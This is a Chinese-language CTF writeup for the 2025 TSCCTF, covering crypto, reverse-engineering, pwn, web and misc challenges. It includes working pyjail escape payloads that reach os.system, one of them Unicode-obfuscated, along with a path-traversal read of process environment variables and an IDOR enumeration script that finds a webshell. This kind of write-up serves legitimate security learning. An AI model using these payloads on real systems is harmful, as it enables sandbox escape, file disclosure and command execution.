---
title: 2025 TSCCTF Writeup
tags:
  - 資安
  - CTF
  - TSCCTF
  - Writeup
categories:
  - 資安
  - CTF
  - Writeup
abbrlink: 20658
date: 2025-01-17 00:00:00
lang:
---

在 Qualified Scoreboard 第五，全部人的第 41，嗚嗚被虐爛了

![Qualified Scoreboard](https://i.imgur.com/IGyLku7.png)

![Overall Scoreboard](https://i.imgur.com/bImlzwR.png)

<!--more-->

## Welcome

### Give you a free flag

把底下反白就出現了

![image](https://hackmd.io/_uploads/rkot-bzwyx.png)

flag: `TSC{W3llc0me_t0_TSC2O2SIlIllI}`

### Please Join Our Discord!!!

在 DC 翻一翻就找到了 OuO 但我看到去年的交了大概 20 幾筆錯的 flag w

![image](https://hackmd.io/_uploads/rJoFoSfPyl.png)

flag: `TSC{w31c0m3_t0_t5cc7f2025_d15c0rd!!!}`

### Feedback Form

就填表單

![image](https://hackmd.io/_uploads/SJO9i1UPyx.png)

flag: `TSC{thanks_for_playing_and_c_u_nexy_year!}`

## Pwn

### gamble_bad_bad

為了讓 `strcmp(game.jackpot_value, "777") == 0` 成立，用 Buffer Overflow

輸入: `AAAAAAAAAAAAAAAAAAAA777`

flag: `TSC{Gamb1e_Very_bad_bad_but_}`

## Crypto

### Very Simple Login

```python
import base64
import hashlib
import json
import os
import re
import sys
import time
from secret import FLAG


def xor(message0: bytes, message1: bytes) -> bytes:
    return bytes(byte0 & byte1 for byte0, byte1 in zip(message0, message1))


def sha256(message: bytes) -> bytes:
    return hashlib.sha256(message).digest()


def hmac_sha256(key: bytes, message: bytes) -> bytes:
    blocksize = 64
    if len(key) > blocksize:
        key = sha256(key)
    if len(key) < blocksize:
        key = key + b'\x00' * (blocksize - len(key))
    o_key_pad = xor(b'\x5c' * blocksize, key)
    i_key_pad = xor(b'\x3c' * blocksize, key)
    return sha256(o_key_pad + sha256(i_key_pad) + message)


def sha256_jwt_dumps(data: dict, exp: int, key: bytes):
    header = {'alg': 'HS256', 'typ': 'JWT'}
    payload = {'sub': data, 'exp': exp}
    header = base64.urlsafe_b64encode(json.dumps(header).encode())
    payload = base64.urlsafe_b64encode(json.dumps(payload).encode())
    signature = hmac_sha256(key, header + b'.' + payload)
    signature = base64.urlsafe_b64encode(signature).rstrip(b'=')
    return header + b'.' + payload + b'.' + signature


def sha256_jwt_loads(jwt: bytes, exp: int, key: bytes) -> dict | None:
    header_payload, signature = jwt.rsplit(b'.', 1)

    sig = hmac_sha256(key, header_payload)
    sig = base64.urlsafe_b64encode(sig).rstrip(b'=')
    if sig != signature:
        raise ValueError('JWT error')

    try:
        header, payload = header_payload.split(b'.')[0], header_payload.split(b'.')[-1]
        header = json.loads(base64.urlsafe_b64decode(header))
        payload = json.loads(base64.urlsafe_b64decode(payload))
        if (header.get('alg') != 'HS256') or (header.get('typ') != 'JWT'):
            raise ValueError('JWT error')
        if int(payload.get('exp')) < exp:
            raise ValueError('JWT error')
    except Exception:
        raise ValueError('JWT error')
    return payload.get('sub')


def register(username: str, key: bytes):
    if re.fullmatch(r'[A-z0-9]+', username) is None:
        raise ValueError("'username' format error.")
    return sha256_jwt_dumps({'username': username}, int(time.time()) + 86400, key)


def login(token: bytes, key: bytes):
    userdata = sha256_jwt_loads(token, int(time.time()), key)
    return userdata['username']


def menu():
    for _ in range(32):
        print('==================')
        print('1. Register')
        print('2. Login')
        print('3. Exit')
        try:
            choice = int(input('> '))
        except Exception:
            pass
        if 1 <= choice <= 3:
            return choice
        print('Error choice !', end='\n\n')
    sys.exit()


def main():
    key = os.urandom(32)
    for _ in range(32):
        choice = menu()
        if choice == 1:
            username = input('Username > ')
            try:
                token = register(username, key)
            except Exception:
                print('Username Error !', end='\n\n')
                continue
            print(f'Token : {token.hex()}', end='\n\n')
        if choice == 2:
            token = bytes.fromhex(input('Token > '))
            try:
                username = login(token, key)
            except Exception:
                print('Token Error !', end='\n\n')
            if username == 'Admin':
                print(f'FLAG : {FLAG}', end='\n\n')
                sys.exit()
            else:
                print('FLAG : TSC{???}', end='\n\n')
        if choice == 3:
            sys.exit()


if __name__ == '__main__':
    try:
        main()
    except Exception:
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()
```

程式裡沒有檢查或限制使用者是否能以 "Admin" 作為帳號，因此只要註冊 "Admin" 並成功獲得 Token，再使用該 Token 進行登入就可以得到 FLAG。

flag: `TSC{Wr0nG_HM4C_7O_L3A_!!!}`

### Classic

```python
import os
import string
import secrets

flag = os.getenv("FLAG") or "TSC{test_flag}"

charset = string.digits + string.ascii_letters + string.punctuation
A, B = secrets.randbelow(2**32), secrets.randbelow(2**32)
assert len(set((A * x + B) % len(charset) for x in range(len(charset)))) == len(charset)

enc = "".join(charset[(charset.find(c) * A + B) % len(charset)] for c in flag)
print(enc)
```

加密後的 flag : ``o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"``

加密方法

```python
charset = string.digits + string.ascii_letters + string.punctuation
A, B = secrets.randbelow(2**32), secrets.randbelow(2**32)
assert len(set((A * x + B) % len(charset) for x in range(len(charset)))) == len(charset)

enc = "".join(charset[(charset.find(c) * A + B) % len(charset)] for c in flag)
```

已知：

- T->o : (55 * A + B) % 94 = 24
- S->\` : (54 * A + B) % 94 = 89
- C->1 : (38 * A + B) % 94 = 1
- {->5 : (90 * A + B) % 94 = 5
- }->" : (92 * A + B) % 94 = 63

從前兩個可以知道：1\*A % 94 = 24-89 = -65 = 29
用後兩個驗證一下：2\*A % 94 = 63-5 = 58

可以直接假設 A = 29 $\rightarrow$ (55 \* A + B) % 94 = (91 + B) % 94 = 24 $\rightarrow$ 假設 B=27

驗證一下 (92 * 29 + 27) % 94 = 63 沒錯

接著就

```python
In [50]: for c in enc:
    ...:     for i in range(94):
    ...:         if ((i*A + B) % 94 == charset.find(c)):
    ...:             print(charset[i], end="")
    ...: 
TSC{c14551c5_c1ph3r5_4r5_fr4g17e}
```

flag: `TSC{c14551c5_c1ph3r5_4r5_fr4g17e}`

### 2DES

```python
#!/usr/bin/env python
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad
from random import choice
from os import urandom
from time import sleep

def encrypt(msg: bytes, key1, key2):
    des1 = DES.new(key1, DES.MODE_ECB)
    des2 = DES.new(key2, DES.MODE_ECB)
    return des2.encrypt(des1.encrypt(pad(msg, des1.block_size)))

def main():
    flag = open('/flag.txt', 'r').read().strip().encode()

    print("This is a 2DES encryption service.")
    print("But you can only control one of the key.")
    print()

    while True:
        print("1. Encrypt flag")
        print("2. Decrypt flag")
        print("3. Exit")
        option = int(input("> "))

        if option == 1:
            # I choose a key
            # You can choose another one
            keyset = ["1FE01FE00EF10EF1", "01E001E001F101F1", "1FFE1FFE0EFE0EFE"]
            key1 = bytes.fromhex(choice(keyset))
            key2 = bytes.fromhex(input("Enter key2 (hex): ").strip())

            ciphertext = encrypt(flag, key1, key2)
            print("Here is your encrypted flag:", flush=True)
            print("...", flush=True)
            sleep(3)
            if ciphertext[:4] == flag[:4]:
                print(ciphertext)
                print("Hmmm... What a coincidence!")
            else:
                print("System error!")
            print()

        elif option == 2:
            print("Decryption are disabled")
            print()

        elif option == 3:
            print("Bye!")
            exit()

        else:
            print("Invalid option")
            print()

if __name__ == "__main__":
    main()
```

題目是會把 flag 用 DES 加密兩次，第一次是會隨機選擇 `["1FE01FE00EF10EF1", "01E001E001F101F1", "1FFE1FFE0EFE0EFE"]` 其中一組當作金鑰加密，第二次加密的金鑰可以自己設定，於是我就想到了 `半弱金鑰` ，查了以下這樣的東西，發現三個都是半弱金鑰，我就拿一個去試了，然後就得到 flag 了 \owo/

- 0x011F011F010E010E and 0x1F011F010E010E01
- 0x01E001E001F101F1 and 0xE001E001F101F101
- 0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01
- 0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E
- 0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E
- 0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1

```
1. Encrypt flag
2. Decrypt flag
3. Exit
> 1
Enter key2 (hex): E01FE01FF10EF10E
Here is your encrypted flag:
...
b'TSC{th3_Key_t0_br34k_DES_15_tHe_keY}\x04\x04\x04\x04'
Hmmm... What a coincidence!
```

flag: `TSC{th3_Key_t0_br34k_DES_15_tHe_keY}`

### 我從來都不覺得算密碼學開心過

```python
from Crypto.Util.number import getPrime, long_to_bytes
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from random import randrange

flag = open('flag.txt', 'r').read().strip().encode()

p = getPrime(16)
r = [randrange(1, p) for _ in range(5)]

print(f'p = {p}')

# You have 5 unknown random numbers
# But you can only get 4 hashes
# It is impossible to recover the flag, right?
for i in range(4):
    h = flag[i]
    for j in range(5):
        h = (h + (j+1) * r[j]) % p
        r[j] = h
    print(f"hash[{i}] = {h}")

key = 0
for rr in r:
    key += rr
    key *= 2**16

key = pad(long_to_bytes(key), 16)
aes = AES.new(key, AES.MODE_ECB)
ciphertext = aes.encrypt(pad(flag, AES.block_size))
print(f"ciphertext = {ciphertext}")
```

簡單來說就是他有 r0~r4 五個未知數，但是他只有四個取模的等式，所以我們枚舉其中一項，就能推出剩下四項，然後帶去解 AES 看解不解的出來，解出來就對了，但是實際上那個等式超醜，我是用 Geogebra 算，還是算了好一陣子才寫出正確的等式，如下

$$
\begin{cases}
r_0 + 2r_1 + 3r_2 + 4r_3 + 5r_4 + 84 \equiv 1934 \pmod{42899} \\
15r_0 + 28r_1 + 36r_2 + 36r_3 + 25r_4 + 1343 \equiv 22627 \pmod{42899} \\
140r_0 + 250r_1 + 291r_2 + 244r_3 + 125r_4 + 13072 \equiv 36616 \pmod{42899} \\
1050r_0 + 1820r_1 + 1980r_2 + 1476r_3 + 625r_4 + 100948 \equiv 21343 \pmod{42899}
\end{cases}
$$

然後叫 ChatGPT 幫我寫個求解的程式碼，然後就依依帶入驗證就可以得到 Flag 了

```python
from sympy import Matrix
from Crypto.Util.number import getPrime, long_to_bytes
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
from random import randrange

p = 42899
hashes = [1934, 22627, 36616, 21343]
ciphertext = b'z\xa5\xa5\x1d\xe5\xd2I\xb1\x15\xec\x95\x8b^\xb6:r=\xe3h\x06-\xe9\x01\xda\xc03\xa4\xf6\xa8_\x8c\x12!MZP\x17O\xee\xa3\x0f\x05\x0b\xea7cnP'

good = 0

for r4 in range(p):
    A = Matrix([
        [1,  2,  3,  4],
        [15, 28, 36, 36],
        [140, 250, 291, 244],
        [1050,1820,1980,1476]
    ])
    B = []
    def mod_sub(a, b): return (a - b) % p
    
    B.append(mod_sub(hashes[0], 5*r4 + 84))
    B.append(mod_sub(hashes[1], 25*r4 + 1343))
    B.append(mod_sub(hashes[2], 125*r4 + 13072))
    B.append(mod_sub(hashes[3], 625*r4 + 100948))

    # Solve in modular arithmetic
    # sympy's solve for modular is not direct; try invert or reduce:
    M = A.det() % p
    if M == 0:
        continue
    try:
        invA = A.inv_mod(p)
    except:
        continue


    sol = invA * Matrix(B)
    r0, r1, r2, r3 = [int(x) % p for x in sol]

    r = [r0, r1, r2, r3, r4]
    flag = 'TSC{}'.encode()
    for i in range(4):
        h = flag[i]
        for j in range(5):
            h = (h + (j+1) * r[j]) % p
            r[j] = h

    key = 0
    for rr in r:
        key += rr
        key *= 2**16
    
    key = pad(long_to_bytes(key), 16)
    aes = AES.new(key, AES.MODE_ECB)
    try:
        decrypted = aes.decrypt(ciphertext).decode()
        if decrypted.startswith('TSC{'):
            print(decrypted)
            print(r0, r1, r2, r3, r4)
            break
    except:
        pass
```

flag: `TSC{d0_4_L1feTim3_0f_crypTogr4phy_w1th_yOu}`

## Reverse

### What_Happened

用 gdb 得到了者個咚咚

```
(gdb) x/s &flag_encrypted
0x405064 <flag_encrypted>:      "\376\371\351\321\343\365\376\302\303\304\301\365\323\305\337\365\354\303\322\365\230\305\307\317\365\231\330\330\305\330\327Decrypted Flag: %s\n"
```

然後看了一下 decrypt 的邏輯

```
(gdb) disassemble decrypt_flag
Dump of assembler code for function decrypt_flag:
   0x004014af <+0>:     push   %ebp
   0x004014b0 <+1>:     mov    %esp,%ebp
   0x004014b2 <+3>:     sub    $0x58,%esp
   0x004014b5 <+6>:     movl   $0x405064,(%esp)
   0x004014bc <+13>:    call   0x403b28 <strlen>
   0x004014c1 <+18>:    mov    %eax,-0x10(%ebp)
   0x004014c4 <+21>:    movl   $0x0,-0xc(%ebp)
   0x004014cb <+28>:    jmp    0x4014eb <decrypt_flag+60>
   0x004014cd <+30>:    mov    -0xc(%ebp),%eax
   0x004014d0 <+33>:    add    $0x405064,%eax
   0x004014d5 <+38>:    movzbl (%eax),%eax
   0x004014d8 <+41>:    xor    $0xffffffaa,%eax
   0x004014db <+44>:    mov    %eax,%ecx
   0x004014dd <+46>:    lea    -0x42(%ebp),%edx
   0x004014e0 <+49>:    mov    -0xc(%ebp),%eax
   0x004014e3 <+52>:    add    %edx,%eax
   0x004014e5 <+54>:    mov    %cl,(%eax)
   0x004014e7 <+56>:    addl   $0x1,-0xc(%ebp)
   0x004014eb <+60>:    mov    -0xc(%ebp),%eax
   0x004014ee <+63>:    cmp    -0x10(%ebp),%eax
   0x004014f1 <+66>:    jl     0x4014cd <decrypt_flag+30>
   0x004014f3 <+68>:    lea    -0x42(%ebp),%edx
   0x004014f6 <+71>:    mov    -0x10(%ebp),%eax
   0x004014f9 <+74>:    add    %edx,%eax
   0x004014fb <+76>:    movb   $0x0,(%eax)
   0x004014fe <+79>:    lea    -0x42(%ebp),%eax
   0x00401501 <+82>:    mov    %eax,0x4(%esp)
   0x00401505 <+86>:    movl   $0x405083,(%esp)
--Type <RET> for more, q to quit, c to continue without paging--c
   0x0040150c <+93>:    call   0x403b60 <printf>
   0x00401511 <+98>:    nop
   0x00401512 <+99>:    leave
   0x00401513 <+100>:   ret
End of assembler dump.
```

可是我看不懂，不過 ChatGPT 跟我說他是把每個字拿去跟 `0x44` xor 的結果，試了一下就得到 flag 了

```python=
encrypted_flag = [
    0xFE, 0xF9, 0xE9, 0xD1, 0xE3, 0xF5, 0xFE, 0xC2, 0xC3, 0xC4,
    0xC1, 0xF5, 0xD3, 0xC5, 0xDF, 0xF5, 0xEC, 0xC3, 0xD2, 0xF5,
    0x98, 0xC5, 0xC7, 0xCF, 0xF5, 0x99, 0xD8, 0xD8, 0xC5, 0xD8,
    0xD7
]
key = 0xAA
decrypted_flag = ''.join(chr(byte ^ key) for byte in encrypted_flag)
print(decrypted_flag)
```

flag: `TSC{I_Think_you_Fix_2ome_3rror}`

### Gateway to the Reverse

隨便亂帶工具試試看，我根本不會 Reverse 就出 flag 了

```shell!
$ ltrace ./gate
puts("================================"...=============================================
)                                                                                   = 46
puts("You stand before the Gate of the"...You stand before the Gate of the Reverse World.
)                                                                                   = 48
puts("A voice echoes from the darkness"...A voice echoes from the darkness:

)                                                                                   = 35
puts("  "Beyond this gate lies the Rev"...  "Beyond this gate lies the Reverse World, a realm
)                                                                                   = 52
puts("   of infinite knowledge and unt"...   of infinite knowledge and untold secrets.
)                                                                                   = 45
puts("   But only those who can deciph"...   But only those who can decipher the key may enter."

)                                                                                   = 56
puts("The gatekeeper continues:"The gatekeeper continues:
)                                                                                             = 26
puts("  "Reveal today's lucky number, "...  "Reveal today's lucky number, and the gate shall open."
)                                                                                   = 58
puts("================================"...=============================================
)                                                                                   = 46
printf("\nEnter the access key: "
)                                                                                            = 23
__isoc99_scanf(0x562eca2c637c, 0x7ffc3c3130b0, 0, 0x562eca2c637bEnter the access key: sadfsd
)                                                             = 1
strlen("NL=rje+fS&eVP!RdK\177=e;{y6CG4Aif")                                                                                   = 30
strcmp("sadfsd", "TSC{th1s_1s_b4by_r3v3rs3_b4by}")                                                                            = 31
puts("  +===========================+"  +===========================+
)                                                                                       = 32
puts("  ||                         ||"  ||                         ||
)                                                                                       = 32
puts("  ||      [  LOCKED  ]       ||"  ||      [  LOCKED  ]       ||
)                                                                                       = 32
puts("  ||                         ||"  ||                         ||
)                                                                                       = 32
puts("  ||   The gate remains      ||"  ||   The gate remains      ||
)                                                                                       = 32
puts("  ||       firmly shut.      ||"  ||       firmly shut.      ||
)                                                                                       = 32
puts("  ||                         ||"  ||                         ||
)                                                                                       = 32
puts("  +===========================+"  +===========================+
)                                                                                       = 32
puts("       ||             ||"       ||             ||
)                                                                                              = 25
puts("       ||             ||"       ||             ||
)                                                                                              = 25
puts("       ||             ||"       ||             ||
)                                                                                              = 25
puts("       ||             ||"       ||             ||
)                                                                                              = 25
puts("       ||             ||"       ||             ||
)                                                                                              = 25
puts("       ||             ||"       ||             ||
)                                                                                              = 25
puts("The gatekeeper's voice booms:"The gatekeeper's voice booms:
)                                                                                         = 30
puts("  "Your answer is incorrect. The"...  "Your answer is incorrect. The gate shall remain closed."
)                                                                                   = 60
puts("  "Return when you have decipher"...  "Return when you have deciphered the true key."
)                                                                                   = 50
+++ exited (status 0) +++
```

flag: `TSC{th1s_1s_b4by_r3v3rs3_b4by}`

## Web

### Ave Mujica

發現這題可以在 `/image?name=` Path Traversal 試了很久，在 `../../../proc/self/environ` 找到了 Flag

```
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=acfe70c044b5FLAG=TSC{敬愛爽🍷}LANG=C.UTF-8GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305PYTHON_VERSION=3.12.8PYTHON_SHA256=c909157bb25ec114e5869124cc2a9c4a4d4c1e957ca4ff553f1edc692101154eHOME=/root
```

flag: `TSC{敬愛爽🍷}`

### Be_IDol

檢查之後發現裡面有個後門

```javascript!
// Backdoor function - ez_login()
function ez_login() {
	document.cookie = "PHPSESSID=secretbackdoor123";
	location.reload();
}
```

就在 console 中打 `ex_login()` 之後就到了 `http://172.31.0.2:8057/index.php` 發現有很多檔案可以下載

![image](https://hackmd.io/_uploads/ByXXZPMPJl.png)

通靈試試看上面沒有的 ID

```shell!
$ curl http://172.31.0.2:8057/download.php\?file_id\=11001
database:
  host: localhost
  user: admin
  password: [REDACTED]
```

發現了非預期的結果，於是我叫 GPT 寫了個程式幫我遍歷 id=10000~20000 的所有檔案，如果回傳結果不是 `This is a normal file with ID:` 或 `File not found` 為開頭就列出來

```python
import requests

# 定義 URL 和檔案 ID 範圍
base_url = "http://172.31.0.2:8057/download.php"
start_id = 10000
end_id = 20000

# 記錄非預期回應
unexpected_responses = {}

# 開始嘗試下載
for file_id in range(start_id, end_id + 1):
    params = {"file_id": file_id}
    try:
        response = requests.get(base_url, params=params)
        if response.status_code == 200:
            content = response.text
            # 過濾預期內容
            if not (content.startswith("This is a normal file with ID:") or "File not found" in content):
                print(f"[{file_id}] 非預期內容")
                print(content)
                unexpected_responses[file_id] = content
    except Exception as e:
        print(f"[{file_id}] 請求失敗: {e}")
```

發現了可能最怪的東東是

```plaintext!
[12001] 非預期內容
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Command Interface</title>
            <style>
                body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
                pre { background: #2d2d2d; padding: 10px; border-radius: 5px; }
                .output { margin-top: 10px; }
            </style>
        </head>
        <body>
            <h2>System Command Interface</h2>
            <form method="GET">
                <input type="hidden" name="file_id" value="12001">
                Command: <input type="text" name="cmd" style="width: 300px;" value="">
                <input type="submit" value="Execute">
            </form>
            <div class="output">
                <pre>Try some commands:
ls -la
pwd
cat /etc/passwd</pre>            </div>
        </body>
        </html>
```

於是我就到 `http://172.31.0.2:8057/download.php?file_id=12001` 發現好像是個 WebShell ，然後隨便找找就發現 flag 了 \OuO/

![image](https://hackmd.io/_uploads/B1D5lwGDyg.png)

flag: `TSC{You_can_be_ID0R_12353oujhefrgiuoewihoqweihfo}`

## Misc

### Subdomain Hijacking

就隨便亂生成一些 subdomain ，發現好像只有開頭字母會引響生成的結果，所以就從 a 試到 z 看看，試到 t 的時候發現他變大寫了？ 趕快拿去試試，就發現得到 flag 了

![image](https://hackmd.io/_uploads/B1jFoyXv1x.png)

![image](https://hackmd.io/_uploads/ByD9s1Xwyl.png)

flag: `TSC{hijacking_success_f5a0651d788f466ba0e5e707ebf00f4d}`

### BabyJail

```python
print(eval(input('> '), {"__builtins__": {}}, {}))
```

`{"__builtins__": {}}` 會移除所有內建函數，試著從能執行系統命令的類別下手，利用 `''.__class__.__base__.__subclasses__()` 發現有個 `<class 'os._wrap_close'>` 能利用一下，就搓出了以下的 payload 成功得到 flag

```shell!
nc 172.31.3.2 8002
> ''.__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('cat flag*')
TSC{just_a_classic_nobuiltins_pyjail_for_baby}
```

flag: `TSC{just_a_classic_nobuiltins_pyjail_for_baby}`

### calc

參考了 [Pyjail CheatSheet 的 Unicode Bypass](https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass) 自己修改蠻久一下，就成功造出一個 shell 了

payload: `(𝘥:=()._＿𝘥𝘰𝘤＿_,𝘥:=()._＿𝘥𝘪𝘳＿_().__𝘤𝘭𝘢𝘴𝘴__(𝘥),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(121).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))`

P.S. 不知道為什麼這坨如果一次複製直接貼上有些字會變成 (U+FFFD) ，但如果分批複製就不會 w

flag: `TSC{PEP-3131_is_a_friendly_PEP_for_pyjai1er_nhsdcuhq6}`
